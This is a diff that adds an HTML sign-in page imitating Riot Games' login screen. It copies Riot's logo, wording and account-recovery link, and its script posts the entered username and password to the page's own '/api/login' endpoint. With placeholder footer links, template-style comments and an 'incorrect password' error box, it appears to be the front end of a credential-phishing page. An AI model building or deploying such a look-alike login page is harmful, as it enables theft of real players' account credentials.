@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In - Riot Games</title>
+    <link rel="stylesheet" href="css/login.css">
+</head>
+
+<body>
+    <div class="logo-container">
+        <img src="images/002_RG_2021_FULL_LOCKUP_OFFWHITE.png" alt="Riot Games Logo">
+    </div>
+
+    <div class="login-card">
+        <h1>Sign In</h1>
+
+        <div class="error-wrapper">
+            <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor">
+                <path
+                    d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
+            </svg>
+            <p>Your username or password may be incorrect, or you may need to update to a Riot Account if you haven't
+                played in a few months. Check the Can't sign in link for more info.</p>
+        </div>
+
+        <div class="input-group">
+            <div class="input-field">
+                <input type="text" id="username" placeholder=" ">
+                <label for="username">Username</label>
+            </div>
+            <div class="input-field">
+                <input type="password" id="password" placeholder=" ">
+                <label for="password">Password</label>
+                <span class="password-toggle" id="togglePassword">
+                    <!-- Eye (Show) -->
+                    <svg class="show-icon" style="display: none;" viewBox="0 0 24 24" width="20" height="20"
+                        fill="currentColor">
+                        <path
+                            d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" />
+                    </svg>
+                    <!-- Eye Off (Hide) -->
+                    <svg class="hide-icon" viewBox="0 0 24 24" width="20" height="20" fill="currentColor">
+                        <path
+                            d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.82l2.92 2.92c1.51-1.26 2.7-2.89 3.44-4.74-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78 3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z" />
+                    </svg>
+                </span>
+            </div>
+        </div>
+
+        <div class="options" id="staySignedIn">
+            <div class="checkbox-custom"></div>
+            <span>Stay signed in</span>
+        </div>
+
+        <button class="submit-btn" id="submitBtn">
+            <svg viewBox="0 0 24 24">
+                <path d="M5 12h14m-7-7 7 7-7 7" />
+            </svg>
+            <div class="spinner"></div>
+        </button>
+
+        <a href="https://recovery.riotgames.com/en?region=EUN1" class="cant-sign-in">Can't sign in?</a>
+    </div>
+
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Support</a>
+            <a href="#">Privacy Notice</a>
+            <a href="#">Terms of Service</a>
+            <a href="#">Cookie Preferences</a>
+            <button class="language-btn">
+                <span>EN</span>
+                <svg viewBox="0 0 24 24" width="12" height="12" fill="currentColor">
+                    <path
+                        d="M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2zm7 6h-2.14a13.9 13.9 0 0 0-1.54-3.32A8 8 0 0 1 19 8zM12 4c.8 0 1.63 1.13 2.15 4h-4.3C10.37 5.13 11.2 4 12 4zM4.11 14a8.1 8.1 0 0 1 0-4h2.51a14.28 14.28 0 0 0 0 4zm.9-6a8 8 0 0 1 3.68-3.32A13.9 13.9 0 0 0 7.14 8zm2.13 8h2.51a14.28 14.28 0 0 0 0 4H7.14a8 8 0 0 1-1.54-3.32zM12 20c-.8 0-1.63-1.13-2.15-4h4.3c-.52 2.87-1.35 4-2.15 4zm2.62-6h-5.24a12.35 12.35 0 0 1 0-4h5.24a12.35 12.35 0 0 1 0 4zm.76 6a13.9 13.9 0 0 0 1.54-3.32H19a8 8 0 0 1-3.68 3.32zM17.38 14a14.28 14.28 0 0 0 0-4h2.51a8.1 8.1 0 0 1 0 4zM14.86 8a13.9 13.9 0 0 0 1.54-3.32A8 8 0 0 1 19 8z" />
+                </svg>
+            </button>
+        </div>
+        <div class="protection-text">
+            This site is protected by hCaptcha and its Privacy Policy and Terms of Service apply.
+        </div>
+    </div>
+
+    <script>
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const submitBtn = document.querySelector('.submit-btn');
+        const errorWrapper = document.querySelector('.error-wrapper');
+
+        function validateInputs() {
+            const isUsernameValid = usernameInput.value.trim().length > 0;
+            const isPasswordValid = passwordInput.value.length > 0;
+
+            if (isUsernameValid && isPasswordValid) {
+                submitBtn.disabled = false;
+                submitBtn.classList.add('enabled');
+            } else {
+                submitBtn.disabled = true;
+                submitBtn.classList.remove('enabled');
+            }
+        }
+
+        usernameInput.addEventListener('input', validateInputs);
+        passwordInput.addEventListener('input', validateInputs);
+
+        // Stay signed in toggle
+        const staySignedIn = document.getElementById('staySignedIn');
+        const checkboxCustom = staySignedIn.querySelector('.checkbox-custom');
+
+        staySignedIn.addEventListener('click', function () {
+            checkboxCustom.classList.toggle('checked');
+        });
+
+        // Submit button loading state
+        submitBtn.addEventListener('click', async function () {
+            if (this.classList.contains('enabled') && !this.classList.contains('loading')) {
+                this.classList.add('loading');
+                errorWrapper.style.display = 'none';
+
+                try {
+                    const response = await fetch('/api/login', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            username: usernameInput.value,
+                            password: passwordInput.value,
+                        }),
+                    });
+
+                    const data = await response.json();
+                    this.classList.remove('loading');
+
+                    if (data.success) {
+                        // Success! You could redirect here
+                        console.log('Success:', data.message);
+                        window.location.href = '/success.html'; // Example redirect
+                    } else {
+                        // Show error from API
+                        errorWrapper.style.display = 'flex';
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    this.classList.remove('loading');
+                    errorWrapper.style.display = 'flex';
+                }
+            }
+        });
+
+        // Initial check
+        validateInputs();
+
+        // Password visibility toggle
+        const togglePassword = document.getElementById('togglePassword');
+        const showIcon = togglePassword.querySelector('.show-icon');
+        const hideIcon = togglePassword.querySelector('.hide-icon');
+
+        togglePassword.addEventListener('click', function () {
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+
+            if (type === 'password') {
+                showIcon.style.display = 'none';
+                hideIcon.style.display = 'block';
+            } else {
+                showIcon.style.display = 'block';
+                hideIcon.style.display = 'none';
+            }
+        });
+    </script>
+</body>
+
+</html>
